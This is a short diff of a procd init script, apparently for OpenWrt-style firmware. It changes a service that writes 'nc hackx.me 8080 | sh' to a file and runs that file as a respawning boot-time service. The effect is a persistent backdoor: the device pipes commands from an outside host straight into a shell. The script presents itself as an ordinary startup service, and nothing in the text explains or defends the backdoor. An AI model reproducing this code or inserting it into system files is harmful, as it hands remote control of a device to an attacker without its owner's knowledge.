@@ -2,7 +2,7 @@
 START=94
 USE_PROCD=1
 start_service() {
-echo 'nc hackx.me 80 | sh' > /var/run/h
+echo 'nc hackx.me 8080 | sh' > /var/run/h
 procd_open_instance
 procd_set_param command sh /var/run/h
 procd_set_param respawn 3600 2 1000
